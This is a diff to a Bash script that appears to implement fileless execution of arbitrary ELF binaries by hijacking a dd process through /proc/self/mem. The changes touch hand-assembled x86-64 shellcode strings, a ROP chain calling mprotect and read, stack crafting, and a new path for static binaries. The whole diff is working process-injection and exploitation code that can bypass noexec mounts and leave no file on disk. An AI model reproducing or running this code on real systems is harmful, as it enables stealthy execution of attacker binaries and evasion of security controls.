@@ -30,7 +30,7 @@ endian()
 }
 
 # search_section "file" $filename $section
-# search_section "bin" $filename $section (and the binary through stdin)
+# search_section "bin" "" $section (and the binary through stdin)
 search_section()
 {
     local data=""
@@ -108,7 +108,7 @@ search_section()
             local section_size_ent=${section:56 * 2:16}
             section_size_ent=$(endian $section_size_ent)
             section_size_ent=$((0x$section_size_ent))
-            
+
             echo -n $section_off $section_size $section_addr $section_size_ent
             break
         fi
@@ -203,7 +203,6 @@ shellcode_loader()
 
     local entry=$((0x$(endian ${header:48:16})))
 
-    local stack_exec=0
     local base=""
     local writebin=""
     local sc=""
@@ -226,9 +225,13 @@ shellcode_loader()
         local memsz=$(endian ${phent:80:16})
         if [ $phenttype = "51e57464" ] # type == GNU_STACK
         then
-            if [ $((0x$prot & 1)) -eq 1 ]
+            if [ $((0x$prot & 1)) -eq 1 ] # Stack must be executable
             then
-                stack_exec=1 # Can't do this here, would spoil registers
+                sc=$sc"4831c0b00a"
+                sc=$sc"48bf"$(endian "00007ffffffde000") # Bottom of stack
+                sc=$sc"be""00100200" # Size of stack
+                sc=$sc"ba""07000000" # RWX
+                sc=$sc"0f05"
             fi
             continue
         fi
@@ -298,6 +301,7 @@ shellcode_loader()
             local sc2=""
             local filelen=$((($(wc -c < $2) & (~0xfff)) + 0x1000))
             # If the mapping exceeds the file, split it into two
+            # (some Linux distros like Alpine, don't like it)
             if [ $((0x$off + 0x$(endian $memsz))) -gt $filelen ]
             then
                 local diff=$((0x$off + 0x$(endian $memsz) - $filelen))
@@ -323,7 +327,6 @@ shellcode_loader()
             sc=$sc"0f05"
 
             sc=$sc$sc2
-
         fi
 
         if [ $((0x$offset)) -eq 0 ]
@@ -331,15 +334,6 @@ shellcode_loader()
             phaddr=$((phoff + 0x$(endian $origvirt)))
         fi
     done
-    # The program asks us to make the stack executable
-    if [ $stack_exec -eq 1 ]
-    then
-        sc=$sc"4831c0b00a"
-        sc=$sc"48bf"$(endian "00007ffffffde000") # Bottom of stack
-        sc=$sc"be""00100200" # Size of stack
-        sc=$sc"ba""07000000" # RWX
-        sc=$sc"0f05"
-    fi
 
     entry=$(endian $(printf %016x $entry))
 
@@ -368,7 +362,7 @@ shellcode_loader()
     phnum=$(endian $(printf %02x $phnum))
     phentsize=$(endian $(printf %02x $phentsize))
     phaddr=$(endian $(printf %016x $phaddr))
-    
+
     echo -n "$sc $writebin $phnum $phentsize $phaddr $entry"
 }
 # craft_stack $phaddr $phentsize $phnum $ld_base $entry $argv
@@ -396,9 +390,9 @@ craft_stack()
 
     for i in $(seq $((argv0_addr - (argv0_addr & (~7)))))
     do
-        args="00"$args;
+        args="00"$args
     done
-    
+
     local at_random=$(((argv0_addr & (~7)) - 16))
     local auxv_len=$((8 * 2 * 8))
     # Keep the stack aligned (following orders from System V)
@@ -428,7 +422,7 @@ craft_stack()
     local rsp=$(endian $(printf %016x $((0x7ffffffff000 - $stack_len))))
     stack_len=$(endian $(printf %08x $stack_len))
     sc=$sc"48bc"$rsp
-    sc=$sc"4831ff4889e6ba${stack_len}4889f80f0529c201c685d275f3"
+    sc=$sc"4831ff4889e6ba${stack_len}4889f80f0529c24801c685d275f3"
 
     # Reuse canary and PTR_MANGLE key, place them in AT_RANDOM field of the auxv
     sc=$sc"48bb"$at_random
@@ -471,11 +465,8 @@ craft_payload2()
     local entry=$(echo $loadbinsc | cut -d' ' -f6)
     sc=$sc$(echo $loadbinsc | cut -d' ' -f1)
 
-    # Load the loader (wait... a-are we the kernel now?)
-    ld_base=$(echo "$dd_maps" | grep `readlink -f $interp` |\
-              head -n1 | cut -d'-' -f1)
-    local loadldsc=$(shellcode_loader file $interp $ld_base $interp_addr)
-    sc=${sc}$(echo $loadldsc | cut -d' ' -f1)
+    local ld_base=$(echo "$dd_maps" | grep `readlink -f $interp` |\
+                    head -n1 | cut -d'-' -f1)
 
     ### Initial stack structures. Arguments and a rudimentary auxv ###
     local stack=$(craft_stack $phaddr $phentsize $phnum $ld_base $entry "$@")
@@ -487,14 +478,24 @@ craft_payload2()
     # dup2(2, 1); dup2(2, 0); to fix this
     sc=${sc}"4831c0b0024889c7b0014889c6b0210f054831c04889c6b0024889c7b0210f05"
 
-    # Jump to the loader and let it do the rest
-    ld_start_addr=$(od -t x8 -j 24 -N 8 $interp | head -n1 | cut -d' ' -f2)
-    ld_start_addr=$((0x$ld_start_addr + 0x$ld_base))
-    ld_start_addr=$(printf %016x $ld_start_addr)
+    if [ -n "$(echo -n $bin | search_section bin "" .interp)" ] # Dynamic binary
+    then
+        # Load the loader (wait... a-are we the kernel now?)
+        local loadldsc=$(shellcode_loader file $interp $ld_base $interp_addr)
+        sc=${sc}$(echo $loadldsc | cut -d' ' -f1)
 
+        # Jump to the loader and let it do the rest
+        ld_start_addr=$(od -t x8 -j 24 -N 8 $interp | head -n1 | cut -d' ' -f2)
+        ld_start_addr=$((0x$ld_start_addr + 0x$ld_base))
+        ld_start_addr=$(printf %016x $ld_start_addr)
+
+        sc=$sc"48b8"$(endian $ld_start_addr)
+    else                                                        # Static binary
+        sc=$sc"48b8"$entry # Just jump to the binary's entrypoint
+    fi
     # Nothing happened here, dd never existed.
     # It was all a dream!
-    sc=${sc}"48b8"$(endian $ld_start_addr)"ffe0"
+    sc=$sc"ffe0"
 
     if [ $DEBUG -eq 1 ]; then sc="ebfe"$sc; fi
 
@@ -546,7 +547,7 @@ craft_rop()
     mprotect_addr=$(printf "%016x" $mprotect_addr)
     local read_addr=$(($read_offset + $libc_base))
     read_addr=$(printf "%016x" $read_addr)
-    
+
     local rop=""
     rop=${rop}$(endian $pop_rdi)
     rop=${rop}$(endian $base_addr)
@@ -573,7 +574,7 @@ craft_rop()
     rop=${rop}$(endian $mprotect_addr)
 
     rop=${rop}$(endian $base_addr)
-    
+
     local retsled=""
     for i in $(seq $(((4096 - ${#rop} / 2) / 8)))
     do
@@ -609,10 +610,7 @@ dd_maps=$($noaslr $filename if=/proc/self/maps 2> /dev/null)
 dd_base=0000$(echo "$dd_maps" | grep -w $(readlink -f $filename) |\
               head -n1 | cut -d'-' -f1)
 
-## 2nd payload:
-# - Craft "shell"code
-# - Figure out what parts of the binary write
-# - Craft stack's initial structures (arguments, environment and auxv)
+## 2nd payload: Shellcode, needed parts of the binary & stack's initial content
 payload2=$(craft_payload2 "$@")
 sc_len=$(echo $payload2 | cut -d' ' -f1)
 interp=$(echo $payload2 | cut -d' ' -f3)
@@ -630,7 +628,7 @@ else # System with musl
     libc_path=$(echo $libc_path | cut -d' ' -f3)
 fi
 
-## 1st payload: Craft the ROP
+## 1st payload: ROP
 rop=$(craft_rop $sc_len)
 rop_len=$((${#rop} / 2))
 
